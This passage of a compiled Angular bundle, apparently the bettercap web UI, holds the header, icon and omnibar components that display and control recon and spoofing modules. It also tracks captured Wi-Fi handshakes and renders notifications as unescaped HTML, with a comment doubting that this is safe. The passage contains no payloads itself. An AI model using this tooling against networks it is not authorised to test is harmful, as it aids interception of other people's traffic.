                _this.apiFirstUpdate = false;
            }),
            this.api.onSessionError.subscribe(function (error) {
                console.error("session error", error);
                _this.apiFirstUpdate = true;
                _this.sessionError = error;
            }),
            this.api.onCommandError.subscribe(function (error) {
                console.error("command error", error);
                _this.commandError = error;
                $('#commandError').modal('show');
            })
        ];
    };
    MainHeaderComponent.prototype.ngOnDestroy = function () {
        for (var i = 0; i < this.subscriptions.length; i++) {
            this.subscriptions[i].unsubscribe();
        }
        this.subscriptions = [];
    };
    MainHeaderComponent.prototype.updateSession = function (session) {
        this.rest = this.api.module('api.rest');
        this.sessionError = null;
        this.counters.hosts = session.lan['hosts'].length || 0;
        this.counters.aps = session.wifi['aps'].length || 0;
        this.counters.ble = session.ble['devices'].length || 0;
        this.counters.hid = session.hid['devices'].length || 0;
        this.counters.gps = this.api.module('gps').running ? (session.gps.NumSatellites || 0) : 0;
        this.counters.caplets = session.caplets.length || 0;
        this.counters.running = session.modules.filter(function (m) { return m.running; }).length;
    };
    MainHeaderComponent.prototype.eventCacheKey = function (event) {
        var key = event.tag + "::";
        if (typeof event.data == 'string')
            key += event.data + "::";
        else
            key += "{}::";
        key += event.time;
        return key;
    };
    MainHeaderComponent.prototype.eventHTML = function (event) {
        // reuse the EventComponent at runtime to get the same HTML
        // we'd have in the event table ... reusability FTW ^_^
        var factory = this.resolver.resolveComponentFactory(_event_event_component__WEBPACK_IMPORTED_MODULE_5__["EventComponent"]);
        var component = factory.create(this.injector);
        component.instance.event = event;
        component.changeDetectorRef.detectChanges();
        return component.location.nativeElement.innerHTML;
    };
    MainHeaderComponent.prototype.isTrackedEvent = function (event) {
        // modules start and stop events
        if (event.tag.indexOf('mod.') == 0)
            return true;
        // generic logs (but not the syn.scan progress or hid payloads)
        if (event.tag == 'sys.log' && event.data.Message.indexOf('syn.scan') == -1 && event.data.Message.indexOf('payload for') == -1)
            return true;
        // some recon module got a new target
        // if( event.tag.indexOf('.new') != -1 && event.tag != 'wifi.client.new' )
        // return true;
        // wifi l00t
        if (event.tag == 'wifi.client.handshake')
            return true;
        return false;
    };
    MainHeaderComponent.prototype.eventClass = function (event) {
        if (event.tag == 'mod.started' || event.tag.indexOf('.new') != -1)
            return 'toast-success';
        else if (event.tag == 'mod.stopped' || event.tag == 'wifi.client.handshake')
            return 'toast-warning';
        else if (event.tag == 'sys.log') {
            if (event.data.Level == 3 /* WARNING */)
                return 'toast-warning';
            else if (event.data.Level == 4 /* ERROR */ || event.data.Level == 5 /* FATAL */)
                return 'toast-error';
        }
        return 'toast-info';
    };
    MainHeaderComponent.prototype.handleTrackedEvent = function (event, firstUpdate) {
        // since we're constantly polling for /api/events and we'll
        // end up getting the same events we already shown in multiple
        // requests, we need to "cache" this information to avoid showing
        // the same notification more than once.
        var evKey = this.eventCacheKey(event);
        if (evKey in this.modNotificationCache === false) {
            this.modNotificationCache[evKey] = true;
            // first time we get the event we don't want to notify the user,
            // otherwise dozens of notifications might be generated after
            // a page refresh
            if (firstUpdate == false && !this.api.module('api.rest').state.replaying) {
                this.toastr.show(this.eventHTML(event), event.tag, {
                    // any dangerous stuff should already be escaped by the 
                    // EventComponent anyway ... i hope ... ... i hope ...
                    enableHtml: true,
                    toastClass: 'ngx-toastr ' + this.eventClass(event)
                });
            }
        }
    };
    MainHeaderComponent.prototype.updateEvents = function (events, firstUpdate) {
        if (firstUpdate === void 0) { firstUpdate = false; }
        this.sessionError = null;
        this.counters.events = events.length;
        if (this.counters.events == 0) {
            this.toastr.clear();
        }
        else {
            for (var i = 0; i < this.counters.events; i++) {
                var event_1 = events[i];
                if (this.isTrackedEvent(event_1)) {
                    this.handleTrackedEvent(event_1, firstUpdate);
                }
            }
        }
    };
    MainHeaderComponent.prototype.logout = function () {
        this.api.logout();
        this.router.navigateByUrl("/login");
    };
    MainHeaderComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
            selector: 'ui-main-header',
            template: __webpack_require__(/*! ./main-header.component.html */ "./src/app/components/main-header/main-header.component.html"),
            styles: [__webpack_require__(/*! ./main-header.component.scss */ "./src/app/components/main-header/main-header.component.scss")]
        }),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", [_services_api_service__WEBPACK_IMPORTED_MODULE_4__["ApiService"],
            _angular_router__WEBPACK_IMPORTED_MODULE_2__["Router"],
            ngx_toastr__WEBPACK_IMPORTED_MODULE_3__["ToastrService"],
            _angular_core__WEBPACK_IMPORTED_MODULE_1__["ComponentFactoryResolver"],
            _angular_core__WEBPACK_IMPORTED_MODULE_1__["Injector"]])
    ], MainHeaderComponent);
    return MainHeaderComponent;
}());



/***/ }),

/***/ "./src/app/components/modicon.pipe.ts":
/*!********************************************!*\
  !*** ./src/app/components/modicon.pipe.ts ***!
  \********************************************/
/*! exports provided: ModIconPipe */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "ModIconPipe", function() { return ModIconPipe; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");


var ModIconPipe = /** @class */ (function () {
    function ModIconPipe() {
    }
    ModIconPipe.prototype.transform = function (name) {
        if (name == 'caplets')
            return 'scroll';
        else if (name == 'hid')
            return 'keyboard';
        else if (name == 'wifi')
            return 'wifi';
        else if (name == 'gps')
            return 'globe';
        else if (name == 'update')
            return 'download';
        else if (name.indexOf('proxy') != -1)
            return 'filter';
        else if (name.indexOf('server') != -1)
            return 'server';
        else if (name.indexOf('recon') != -1)
            return 'eye';
        else if (name.indexOf('spoof') != -1)
            return 'radiation';
        else if (name.indexOf('net.') === 0)
            return 'network-wired';
        return 'tools';
    };
    ModIconPipe = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Pipe"])({ name: 'modicon' })
    ], ModIconPipe);
    return ModIconPipe;
}());



/***/ }),

/***/ "./src/app/components/omnibar/omnibar.component.html":
/*!***********************************************************!*\
  !*** ./src/app/components/omnibar/omnibar.component.html ***!
  \***********************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<div class=\"omnibar collapse\" [class.show]=\"api.settings.omnibar\" id=\"omniCollapse\">\n\n  <div *ngIf=\"withCmd\" class=\"row\">\n\n    <div *ngIf=\"rest.state.replaying\" class=\"col-md-12\">\n      <div class=\"input-group input-group-sm\">\n        \n        <button \n            *ngIf=\"rest.state.replaying\"\n             type=\"button\" \n             class=\"btn btn-dark btn-sm\" \n             placement=\"right\" \n             ngbTooltip=\"{{ api.isPaused() ? 'Continue' : 'Pause' }} replay.\"\n             (click)=\"api.paused = !api.paused\">\n          <i *ngIf=\"api.isPaused()\" class=\"fas fa-play\"></i>\n          <i *ngIf=\"!api.isPaused()\" class=\"fas fa-pause\"></i>\n        </button>\n\n        <button \n           type=\"button\" \n           class=\"btn btn-dark btn-sm\" \n           placement=\"right\" \n           ngbTooltip=\"Stop replay.\"\n           (click)=\"stopReplaying()\">\n          <i class=\"fas fa-stop\"></i>\n        </button>\n\n        <button class=\"btn btn-dark btn-sm\" ngbTooltip=\"Replaying {{ api.session.polled_at | date:'short' }}\">\n          {{ curReplaytime() | rectime }}\n        </button>\n\n        <input \n         type=\"range\" \n         id=\"replayRange\"\n         class=\"custom-range\" \n         (change)=\"setReplayFrame($event.target.value)\" \n         min=\"0\" \n         max=\"{{ rest.state.rec_frames }}\" \n         value=\"{{ rest.state.rec_cur_frame }}\">\n\n        <button class=\"btn btn-dark btn-sm\">\n          {{ rest.state.rec_time | rectime }}\n        </button>\n\n      </div>\n    </div>\n\n    <div class=\"col-md-12\" *ngIf=\"!rest.state.replaying\">\n      <div class=\"input-group input-group-sm\">\n\n        <button \n           *ngIf=\"rest.state.recording\"\n           type=\"button\" \n           class=\"btn btn-dark btn-sm\" \n           ngbTooltip=\"Stop recording the session.\" \n           placement=\"right\" \n           (click)=\"stopRecording()\">\n          <i class=\"fas fa-stop\"></i>\n          {{ rest.state.rec_time | rectime }}\n        </button>\n\n        <button *ngIf=\"rest.state.loading\" class=\"btn btn-sm btn-dark\" disabled>\n          loading ...\n        </button>\n\n        <div ngbDropdown *ngIf=\"withLimit && !rest.state.recording && !rest.state.replaying && !rest.state.loading\">\n          <button ngbDropdownToggle \n           ngbTooltip=\"Record or replay the session.\"\n           placement=\"right\"\n           class=\"btn btn-dark btn-sm\">\n            <i class=\"fas fa-video\"></i>\n          </button>\n\n          <div ngbDropdownMenu class=\"menu-dropdown\">\n            <ul>\n              <li>\n                <a (click)=\"showRecordModal()\">\n                  <i class=\"fas fa-circle\" style=\"color: darkred\"></i> Record Session\n                </a>\n              </li>\n              <li>\n                <a (click)=\"showReplayModal()\">\n                  <i class=\"fas fa-folder-open\"></i> Replay\n                </a>\n              </li>\n            </ul>\n          </div>\n        </div>\n\n        <button \n           type=\"button\" \n           class=\"btn btn-dark btn-sm\" \n           ngbTooltip=\"{{ api.isPaused() ? 'Resume API polling.' : 'Pause API polling and freeze the UI for editing.' }}\" \n           placement=\"right\" \n           (click)=\"api.paused = !api.paused\">\n          <i *ngIf=\"api.isPaused()\" class=\"fas fa-play\"></i>\n          <span *ngIf=\"!api.isPaused()\">\n            {{ api.ping }}ms\n          </span>\n        </button>\n\n        <button \n           *ngIf=\"clearCmd\" \n           type=\"button\" \n           class=\"btn btn-dark btn-sm\" \n           ngbTooltip=\"Clear records from the current view.\" \n           placement=\"right\" \n           (click)=\"onClearClicked()\">\n          <i class=\"fas fa-trash-alt\"></i>\n        </button>\n\n        <ng-container *ngIf=\"withLimit\">\n          <select \n              (change)=\"api.settings.events = $event.target.value\" \n              placement=\"right\"\n              ngbTooltip=\"Set how many events to display.\">\n            <option value=\"15\" [selected]=\"api.settings.events == 15\">15</option>\n            <option value=\"25\" [selected]=\"api.settings.events == 25\">25</option>\n            <option value=\"50\" [selected]=\"api.settings.events == 50\">50</option>\n            <option value=\"100\" [selected]=\"api.settings.events == 100\">100</option>\n            <option value=\"500\" [selected]=\"api.settings.events == 500\">500</option>\n          </select>\n        </ng-container>\n\n        <ng-container *ngIf=\"withIfaces\">\n          <span \n            *ngIf=\"ifaces.length == 0\" \n            ngbTooltip=\"No compatible interfaces found. Disconnect from any network the wireless interface you want to use for scanning.\"\n            placement=\"right\"\n            class=\"badge badge-warning\" \n            style=\"margin: 3px; padding-top:7px\">\n            <i class=\"fas fa-exclamation-triangle\"></i>\n          </span>\n          <select \n              id=\"wifiiface\"\n              *ngIf=\"ifaces.length > 0\"\n              [disabled]=\"api.module('wifi').running\" \n              (change)=\"onSetWifiInterface($event.target.value)\" \n              ngbTooltip=\"Change the wifi.interface parameter.\">\n            <option \n                *ngFor=\"let iface of ifaces\" \n                value=\"{{ iface.name }}\"\n                [selected]=\"isWifiIface(iface)\"\n                >{{ iface.name }}</option>\n          </select>\n        </ng-container>\n\n        <span *ngFor=\"let mod of modules | keyvalue\">\n          <button \n            type=\"button\" \n            class=\"btn btn-dark btn-sm\" \n            ngbTooltip=\"{{(enabled[mod.key] ? 'Stop ' : 'Start ') + mod.key + ' module.'}}\" \n            placement=\"right\" \n            (click)=\"onModuleToggleClicked(mod)\">\n            <i *ngIf=\"enabled[mod.key]\" class=\"fas fa-stop\"></i>\n            <i *ngIf=\"!enabled[mod.key]\" class=\"fas fa-play\"></i>\n          </button>\n        </span>\n\n        <div class=\"input-group-prepend\">\n          <span class=\"input-group-text\">\n            <i class=\"fas fa-terminal\"></i>\n          </span>\n        </div>\n        <input [ngbTypeahead]=\"searchCommand\" [(ngModel)]=\"cmd\" id=\"cmd\" (keyup.enter)=\"onCmd()\" type=\"text\" class=\"form-control\" placeholder=\"Command bar ...\" aria-label=\"Command bar ...\"/>\n\n        <button \n           type=\"button\" \n           class=\"btn btn-dark btn-sm\" \n           ngbTooltip=\"Hide Omnibar\" \n           placement=\"left\" \n           (click)=\"api.settings.omnibar = false\">\n          <i class=\"far fa-caret-square-up\"></i>\n        </button>\n      </div>\n    </div>\n  </div>\n\n  <div class=\"row\">\n    <div class=\"col-md-12\">\n      <div class=\"input-group input-group-sm\">\n        <input [(ngModel)]=\"svc.query\" type=\"text\" class=\"form-control\" placeholder=\"Search ...\" aria-label=\"Search\"/>\n      </div>\n    </div>\n  </div>\n\n</div>\n\n<div id=\"recordModal\" class=\"modal fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"recordModalTitle\">\n  <div class=\"modal-dialog\" role=\"document\">\n    <div class=\"modal-content\">\n      <div class=\"modal-header\">\n        <div class=\"modal-title\">\n          <h5 id=\"recordModalTitle\">Record File</h5>\n        </div>\n        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\">\n          <span aria-hidden=\"true\">&times;</span>\n        </button>\n      </div>\n      <div class=\"modal-body\">\n        <form (ngSubmit)=\"doRecord()\">\n          <div class=\"form-group row\">\n            <div class=\"col\">\n              <input type=\"text\" class=\"form-control\" id=\"recordFile\" value=\"\">\n            </div>\n          </div>\n          <div class=\"text-right\">\n            <button type=\"submit\" class=\"btn btn-dark\">Start Recording</button>\n          </div>\n        </form>\n      </div>\n    </div>\n  </div>\n</div>\n\n<div id=\"loadingModal\" class=\"modal fade\" data-backdrop=\"static\" data-keyboard=\"false\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"loadingModalTitle\">\n  <div class=\"modal-dialog\" role=\"document\">\n    <div class=\"modal-content\">\n      <div class=\"modal-body\">\n          Loading session from {{ rest.state.rec_filename.split('/').pop() }} ...\n          <br>\n          <br/>\n          <ngb-progressbar \n            type=\"success\" \n            [value]=\"rest.state.load_progress\"\n            [striped]=\"true\" \n            [animated]=\"true\">\n              <i>{{ rest.state.load_progress | number:'1.0-0' }}%</i>\n          </ngb-progressbar>\n      </div>\n    </div>\n  </div>\n</div>\n\n<div id=\"replayModal\" class=\"modal fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"replayModalTitle\">\n  <div class=\"modal-dialog\" role=\"document\">\n    <div class=\"modal-content\">\n      <div class=\"modal-header\">\n        <div class=\"modal-title\">\n          <h5 id=\"replayModalTitle\">Replay Session File</h5>\n        </div>\n        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\">\n          <span aria-hidden=\"true\">&times;</span>\n        </button>\n      </div>\n      <div class=\"modal-body\">\n        <form (ngSubmit)=\"doReplay()\">\n          <div class=\"form-group row\">\n            <div class=\"col\">\n              <input type=\"text\" class=\"form-control\" id=\"replayFile\" value=\"\">\n            </div>\n          </div>\n          <div class=\"text-right\">\n            <button type=\"submit\" class=\"btn btn-dark\">Replay</button>\n          </div>\n        </form>\n      </div>\n    </div>\n  </div>\n</div>\n\n"

/***/ }),

/***/ "./src/app/components/omnibar/omnibar.component.scss":
/*!***********************************************************!*\
  !*** ./src/app/components/omnibar/omnibar.component.scss ***!
  \***********************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = ".omnibar {\n  padding: 5px;\n  padding-top: 0;\n  background-color: #343a40;\n  padding-bottom: 10px;\n}\n.omnibar button {\n  background-color: #333;\n  color: #999;\n}\n.omnibar input,\n.omnibar select,\n.omnibar label {\n  background-color: #333;\n  border: 1px solid #353535;\n  color: #aaa;\n}\n.omnibar select {\n  font-size: 0.8rem;\n}\n.omnibar .input-group-text {\n  border: 1px solid #353535;\n  background-color: #333;\n  color: #999;\n}\n.input-group > .custom-range {\n  display: block;\n  height: calc(2.25rem + 2px);\n  padding: 0 0.75rem;\n  font-size: 1rem;\n  line-height: 1.5;\n  background-clip: padding-box;\n  border-radius: 0.25rem;\n  transition: box-shadow 0.15s ease-in-out;\n}\n.input-group > .custom-range {\n  position: relative;\n  flex: 1 1 auto;\n  width: 1%;\n  margin-bottom: 0;\n}\n.input-group > .custom-range:focus {\n  z-index: 3;\n}\n.input-group-sm > .custom-range {\n  height: calc(1.8125rem + 2px);\n  padding: 0 0.5rem;\n  font-size: 0.875rem;\n  line-height: 1.5;\n  border-radius: 0.2rem;\n}\n.input-group-lg > .custom-range {\n  height: calc(2.875rem + 2px);\n  padding-left: 0 1rem;\n  font-size: 1.25rem;\n  line-height: 1.5;\n  border-radius: 0.3rem;\n}\n.input-group > .custom-range:not(:last-child) {\n  border-top-right-radius: 0;\n  border-bottom-right-radius: 0;\n}\n.input-group > .custom-range:not(:first-child) {\n  border-top-left-radius: 0;\n  border-bottom-left-radius: 0;\n}\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy9ldmlsc29ja2V0L0JhaGFtdXQvTGFiL2JldHRlcmNhcC91aS9zcmMvYXBwL2NvbXBvbmVudHMvb21uaWJhci9vbW5pYmFyLmNvbXBvbmVudC5zY3NzIiwic3JjL2FwcC9jb21wb25lbnRzL29tbmliYXIvb21uaWJhci5jb21wb25lbnQuc2NzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNJLFlBQUE7RUFDQSxjQUFBO0VBQ0EseUJBQUE7RUFFQSxvQkFBQTtBQ0FKO0FERUk7RUFDSSxzQkFBQTtFQUNBLFdBQUE7QUNBUjtBREdJOzs7RUFHSSxzQkFBQTtFQUNBLHlCQUFBO0VBQ0EsV0FBQTtBQ0RSO0FEUUk7RUFDSSxpQkFBQTtBQ05SO0FEU0k7RUFDSSx5QkFBQTtFQUNBLHNCQUFBO0VBQ0EsV0FBQTtBQ1BSO0FEWUE7RUFDRSxjQUFBO0VBQ0EsMkJBQUE7RUFDQSxrQkFBQTtFQUNBLGVBQUE7RUFDQSxnQkFBQTtFQUNBLDRCQUFBO0VBQ0Esc0JBQUE7RUFDQSx3Q0FBQTtBQ1RGO0FEV0E7RUFDRSxrQkFBQTtFQUVBLGNBQUE7RUFDQSxTQUFBO0VBQ0EsZ0JBQUE7QUNSRjtBRFVBO0VBQ0UsVUFBQTtBQ1BGO0FEU0E7RUFDRSw2QkFBQTtFQUNBLGlCQUFBO0VBQ0EsbUJBQUE7RUFDQSxnQkFBQTtFQUNBLHFCQUFBO0FDTkY7QURRQTtFQUNFLDRCQUFBO0VBQ0Esb0JBQUE7RUFDQSxrQkFBQTtFQUNBLGdCQUFBO0VBQ0EscUJBQUE7QUNMRjtBRE9BO0VBQ0UsMEJBQUE7RUFDQSw2QkFBQTtBQ0pGO0FETUE7RUFDRSx5QkFBQTtFQUNBLDRCQUFBO0FDSEYiLCJmaWxlIjoic3JjL2FwcC9jb21wb25lbnRzL29tbmliYXIvb21uaWJhci5jb21wb25lbnQuc2NzcyIsInNvdXJjZXNDb250ZW50IjpbIi5vbW5pYmFyIHtcbiAgICBwYWRkaW5nOiA1cHg7XG4gICAgcGFkZGluZy10b3A6IDA7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogIzM0M2E0MDtcbiAgICAvLyBib3JkZXItYm90dG9tOiAxcHggc29saWQgIzIyMjtcbiAgICBwYWRkaW5nLWJvdHRvbTogMTBweDtcblxuICAgIGJ1dHRvbiB7XG4gICAgICAgIGJhY2tncm91bmQtY29sb3I6IzMzMzsgXG4gICAgICAgIGNvbG9yOiAjOTk5O1xuICAgIH1cblxuICAgIGlucHV0LFxuICAgIHNlbGVjdCxcbiAgICBsYWJlbCB7XG4gICAgICAgIGJhY2tncm91bmQtY29sb3I6IzMzMzsgXG4gICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICMzNTM1MzU7IFxuICAgICAgICBjb2xvcjogI2FhYTtcbiAgICB9XG5cbiAgICBsYWJlbCB7XG5cbiAgICB9XG5cbiAgICBzZWxlY3Qge1xuICAgICAgICBmb250LXNpemU6IC44cmVtO1xuICAgIH1cblxuICAgIC5pbnB1dC1ncm91cC10ZXh0IHtcbiAgICAgICAgYm9yZGVyOiAxcHggc29saWQgIzM1MzUzNTsgXG4gICAgICAgIGJhY2tncm91bmQtY29sb3I6IzMzMzsgXG4gICAgICAgIGNvbG9yOiAjOTk5O1xuICAgIH1cbn1cblxuLy8gaHR0cHM6Ly9naXRodWIuY29tL3R3YnMvYm9vdHN0cmFwL2lzc3Vlcy8yNzU3MlxuLmlucHV0LWdyb3VwID4gLmN1c3RvbS1yYW5nZSB7XG4gIGRpc3BsYXk6IGJsb2NrO1xuICBoZWlnaHQ6IGNhbGMoMi4yNXJlbSArIDJweCk7XG4gIHBhZGRpbmc6IDAgLjc1cmVtO1xuICBmb250LXNpemU6IDFyZW07XG4gIGxpbmUtaGVpZ2h0OiAxLjU7XG4gIGJhY2tncm91bmQtY2xpcDogcGFkZGluZy1ib3g7XG4gIGJvcmRlci1yYWRpdXM6IC4yNXJlbTtcbiAgdHJhbnNpdGlvbjogYm94LXNoYWRvdyAuMTVzIGVhc2UtaW4tb3V0O1xufVxuLmlucHV0LWdyb3VwID4gLmN1c3RvbS1yYW5nZSB7XG4gIHBvc2l0aW9uOiByZWxhdGl2ZTtcbiAgLW1zLWZsZXg6IDEgMSBhdXRvO1xuICBmbGV4OiAxIDEgYXV0bztcbiAgd2lkdGg6IDElO1xuICBtYXJnaW4tYm90dG9tOiAwO1xufVxuLmlucHV0LWdyb3VwID4gLmN1c3RvbS1yYW5nZTpmb2N1cyB7XG4gIHotaW5kZXg6IDM7XG59XG4uaW5wdXQtZ3JvdXAtc20gPiAuY3VzdG9tLXJhbmdlIHtcbiAgaGVpZ2h0OiBjYWxjKDEuODEyNXJlbSArIDJweCk7XG4gIHBhZGRpbmc6IDAgLjVyZW07XG4gIGZvbnQtc2l6ZTogLjg3NXJlbTtcbiAgbGluZS1oZWlnaHQ6IDEuNTtcbiAgYm9yZGVyLXJhZGl1czogLjJyZW07XG59XG4uaW5wdXQtZ3JvdXAtbGcgPiAuY3VzdG9tLXJhbmdlIHtcbiAgaGVpZ2h0OiBjYWxjKDIuODc1cmVtICsgMnB4KTtcbiAgcGFkZGluZy1sZWZ0OiAwIDFyZW07XG4gIGZvbnQtc2l6ZTogMS4yNXJlbTtcbiAgbGluZS1oZWlnaHQ6IDEuNTtcbiAgYm9yZGVyLXJhZGl1czogLjNyZW07XG59XG4uaW5wdXQtZ3JvdXAgPiAuY3VzdG9tLXJhbmdlOm5vdCg6bGFzdC1jaGlsZCkge1xuICBib3JkZXItdG9wLXJpZ2h0LXJhZGl1czogMDtcbiAgYm9yZGVyLWJvdHRvbS1yaWdodC1yYWRpdXM6IDA7XG59XG4uaW5wdXQtZ3JvdXAgPiAuY3VzdG9tLXJhbmdlOm5vdCg6Zmlyc3QtY2hpbGQpIHtcbiAgYm9yZGVyLXRvcC1sZWZ0LXJhZGl1czogMDtcbiAgYm9yZGVyLWJvdHRvbS1sZWZ0LXJhZGl1czogMDtcbn1cblxuXG4iLCIub21uaWJhciB7XG4gIHBhZGRpbmc6IDVweDtcbiAgcGFkZGluZy10b3A6IDA7XG4gIGJhY2tncm91bmQtY29sb3I6ICMzNDNhNDA7XG4gIHBhZGRpbmctYm90dG9tOiAxMHB4O1xufVxuLm9tbmliYXIgYnV0dG9uIHtcbiAgYmFja2dyb3VuZC1jb2xvcjogIzMzMztcbiAgY29sb3I6ICM5OTk7XG59XG4ub21uaWJhciBpbnB1dCxcbi5vbW5pYmFyIHNlbGVjdCxcbi5vbW5pYmFyIGxhYmVsIHtcbiAgYmFja2dyb3VuZC1jb2xvcjogIzMzMztcbiAgYm9yZGVyOiAxcHggc29saWQgIzM1MzUzNTtcbiAgY29sb3I6ICNhYWE7XG59XG4ub21uaWJhciBzZWxlY3Qge1xuICBmb250LXNpemU6IDAuOHJlbTtcbn1cbi5vbW5pYmFyIC5pbnB1dC1ncm91cC10ZXh0IHtcbiAgYm9yZGVyOiAxcHggc29saWQgIzM1MzUzNTtcbiAgYmFja2dyb3VuZC1jb2xvcjogIzMzMztcbiAgY29sb3I6ICM5OTk7XG59XG5cbi5pbnB1dC1ncm91cCA+IC5jdXN0b20tcmFuZ2Uge1xuICBkaXNwbGF5OiBibG9jaztcbiAgaGVpZ2h0OiBjYWxjKDIuMjVyZW0gKyAycHgpO1xuICBwYWRkaW5nOiAwIDAuNzVyZW07XG4gIGZvbnQtc2l6ZTogMXJlbTtcbiAgbGluZS1oZWlnaHQ6IDEuNTtcbiAgYmFja2dyb3VuZC1jbGlwOiBwYWRkaW5nLWJveDtcbiAgYm9yZGVyLXJhZGl1czogMC4yNXJlbTtcbiAgdHJhbnNpdGlvbjogYm94LXNoYWRvdyAwLjE1cyBlYXNlLWluLW91dDtcbn1cblxuLmlucHV0LWdyb3VwID4gLmN1c3RvbS1yYW5nZSB7XG4gIHBvc2l0aW9uOiByZWxhdGl2ZTtcbiAgLW1zLWZsZXg6IDEgMSBhdXRvO1xuICBmbGV4OiAxIDEgYXV0bztcbiAgd2lkdGg6IDElO1xuICBtYXJnaW4tYm90dG9tOiAwO1xufVxuXG4uaW5wdXQtZ3JvdXAgPiAuY3VzdG9tLXJhbmdlOmZvY3VzIHtcbiAgei1pbmRleDogMztcbn1cblxuLmlucHV0LWdyb3VwLXNtID4gLmN1c3RvbS1yYW5nZSB7XG4gIGhlaWdodDogY2FsYygxLjgxMjVyZW0gKyAycHgpO1xuICBwYWRkaW5nOiAwIDAuNXJlbTtcbiAgZm9udC1zaXplOiAwLjg3NXJlbTtcbiAgbGluZS1oZWlnaHQ6IDEuNTtcbiAgYm9yZGVyLXJhZGl1czogMC4ycmVtO1xufVxuXG4uaW5wdXQtZ3JvdXAtbGcgPiAuY3VzdG9tLXJhbmdlIHtcbiAgaGVpZ2h0OiBjYWxjKDIuODc1cmVtICsgMnB4KTtcbiAgcGFkZGluZy1sZWZ0OiAwIDFyZW07XG4gIGZvbnQtc2l6ZTogMS4yNXJlbTtcbiAgbGluZS1oZWlnaHQ6IDEuNTtcbiAgYm9yZGVyLXJhZGl1czogMC4zcmVtO1xufVxuXG4uaW5wdXQtZ3JvdXAgPiAuY3VzdG9tLXJhbmdlOm5vdCg6bGFzdC1jaGlsZCkge1xuICBib3JkZXItdG9wLXJpZ2h0LXJhZGl1czogMDtcbiAgYm9yZGVyLWJvdHRvbS1yaWdodC1yYWRpdXM6IDA7XG59XG5cbi5pbnB1dC1ncm91cCA+IC5jdXN0b20tcmFuZ2U6bm90KDpmaXJzdC1jaGlsZCkge1xuICBib3JkZXItdG9wLWxlZnQtcmFkaXVzOiAwO1xuICBib3JkZXItYm90dG9tLWxlZnQtcmFkaXVzOiAwO1xufSJdfQ== */"

/***/ }),

/***/ "./src/app/components/omnibar/omnibar.component.ts":
/*!*********************************************************!*\
  !*** ./src/app/components/omnibar/omnibar.component.ts ***!
  \*********************************************************/
/*! exports provided: OmnibarComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "OmnibarComponent", function() { return OmnibarComponent; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _angular_router__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! @angular/router */ "./node_modules/@angular/router/fesm5/router.js");
/* harmony import */ var rxjs_operators__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! rxjs/operators */ "./node_modules/rxjs/_esm5/operators/index.js");
/* harmony import */ var _services_omnibar_service__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ../../services/omnibar.service */ "./src/app/services/omnibar.service.ts");
/* harmony import */ var _services_api_service__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ../../services/api.service */ "./src/app/services/api.service.ts");
/* harmony import */ var ngx_toastr__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ngx-toastr */ "./node_modules/ngx-toastr/fesm5/ngx-toastr.js");







// due to https://github.com/ng-bootstrap/ng-bootstrap/issues/917
var handlers = [];
var params = [];
var OmnibarComponent = /** @class */ (function () {
    function OmnibarComponent(svc, api, toastr, router) {
        this.svc = svc;
        this.api = api;
        this.toastr = toastr;
        this.router = router;
        this.modules = {};
        this.clearCmd = "";
        this.restorePause = false;
        this.withCmd = false;
        this.withLimit = false;
        this.withIfaces = false;
        this.enabled = {};
        this.cmd = '';
        this.ifaces = [];
        this.rest = null;
        this.configs = {
            '/lan': {
                'modules': {
                    'net.recon': 'net.recon',
                    'net.probe': 'net.probe'
                },
                'clearCmd': 'net.clear',
                'withCmd': true
            },
            '/wifi': {
                'modules': { 'wifi': 'wifi.recon' },
                'clearCmd': 'wifi.clear',
                'withCmd': true,
                'withIfaces': true
            },
            '/ble': {
                'modules': { 'ble.recon': 'ble.recon' },
                'clearCmd': 'ble.clear',
                'withCmd': true
            },
            '/hid': {
                'modules': { 'hid': 'hid.recon' },
                'clearCmd': 'hid.clear',
                'withCmd': true,
            },
            '/gps': {
                'modules': { 'gps': 'gps' },
                'withCmd': true,
            },
            '/caplets': {
                'withCmd': true
            },
            '/advanced': {
                'withCmd': true
            },
            '/events': {
                'clearCmd': 'events.clear',
                'withCmd': true,
                'withLimit': true
            },
        };
    }
    OmnibarComponent.prototype.ngOnInit = function () {
        var _this = this;
        this.router.events
            .subscribe(function (event) {
